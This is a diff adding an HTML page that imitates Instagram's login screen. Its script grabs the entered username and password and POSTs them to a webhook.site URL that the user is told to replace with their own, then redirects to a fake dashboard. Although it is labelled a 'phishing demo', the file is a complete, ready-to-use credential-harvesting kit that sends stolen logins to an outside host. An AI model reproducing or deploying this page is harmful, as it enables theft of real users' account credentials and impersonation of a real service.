@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container { display: flex; flex-direction: column; align-items: center; gap: 10px; }
+        .login-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 20px;
+            width: 350px;
+            text-align: center;
+        }
+        .logo { width: 175px; margin-bottom: 24px; }
+        form { display: flex; flex-direction: column; gap: 6px; }
+        input {
+            padding: 9px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            outline: none;
+            width: 100%;
+        }
+        input:focus { border-color: #a8a8a8; }
+        button {
+            background: #0095f6;
+            border: none;
+            border-radius: 8px;
+            padding: 7px 16px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 8px;
+            opacity: 0.7;
+            width: 100%;
+        }
+        button:hover { opacity: 1; }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            gap: 18px;
+        }
+        .line { flex: 1; height: 1px; background: #dbdbdb; }
+        .or { color: #737373; font-size: 13px; font-weight: 600; }
+        .facebook-login { margin-bottom: 12px; }
+        .facebook-login a {
+            color: #385185;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .fb-icon { width: 16px; height: 16px; }
+        .forgot-password { color: #00376b; font-size: 12px; text-decoration: none; }
+        .signup-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            width: 350px;
+            text-align: center;
+            font-size: 14px;
+        }
+        .signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
+        .get-app { text-align: center; margin-top: 10px; }
+        .get-app p { font-size: 14px; margin-bottom: 15px; }
+        .app-links { display: flex; gap: 8px; justify-content: center; }
+        .app-links img { height: 40px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://www.instagram.com/static/images/web/logout.jpg" alt="Instagram" class="logo">
+            
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+
+            <div class="divider">
+                <span class="line"></span>
+                <span class="or">OR</span>
+                <span class="line"></span>
+            </div>
+
+            <div class="facebook-login">
+                <a href="#">
+                    <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="FB" class="fb-icon">
+                    Log in with Facebook
+                </a>
+            </div>
+
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-links">
+                <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png" alt="App Store"></a>
+                <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png" alt="Google Play"></a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            // ⚠️ REPLACE THIS WITH YOUR WEBHOOK URL
+            const WEBHOOK_URL = "https://webhook.site/YOUR-UNIQUE-ID-HERE";
+
+            const payload = {
+                username: username,
+                password: password,
+                timestamp: new Date().toISOString(),
+                source: "Instagram Phishing Demo"
+            };
+
+            // Send to webhook
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+
+            // Redirect to the fake dashboard (the result page)
+            window.location.href = "dashboard.html?user=" + encodeURIComponent(username);
+        });
+    </script>
+</body>
+</html>
